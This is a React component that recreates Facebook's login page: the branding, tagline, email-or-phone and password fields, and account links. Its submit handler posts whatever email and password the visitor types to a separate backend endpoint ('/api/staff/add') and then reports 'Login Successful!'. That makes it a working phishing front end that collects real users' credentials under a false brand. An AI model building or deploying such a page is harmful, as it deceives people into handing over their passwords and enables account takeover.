import React, { useState } from "react";
import './FBLoginUI.css'; // Import the CSS file for styling

const FBLoginUI = () => {
  const [username, setUsername] = useState("");
  const [pass, setPass] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const res = await fetch(`${process.env.REACT_APP_API_URL}/api/staff/add`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: username,
          password: pass,
        }),
      });

      if (res.ok) {
        const data = await res.json();
        alert("Login Successful!");
        console.log(data);
      } else {
        alert("Error... Please try again!");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("Error connecting to the server.");
    }
  };

  return (
    <div className="fb-login-container">
      <div className="fb-login-left">
        <h1>facebook</h1>
        <p>Connect with friends and the world around you on Facebook.</p>
      </div>
      <div className="fb-login-right">
        <div className="fb-login-form">
          <form onSubmit={handleSubmit}>
            <input
              type="text"
              placeholder="Email or Phone"
              onChange={(e) => setUsername(e.target.value)}
            />
            <input
              type="password"
              placeholder="Password"
              onChange={(e) => setPass(e.target.value)}
            />
            <button
              className="fb-login-button"
              type="submit"
              style={{ backgroundColor: "blue" }}
            >
              Log In
            </button>
          </form>
          <a href="#" className="forgot-password-link">Forgotten password?</a>
          <div className="divider"></div>
          <button className="create-account-button">Create New Account</button>
        </div>
      </div>
    </div>
  );
};

export default FBLoginUI;
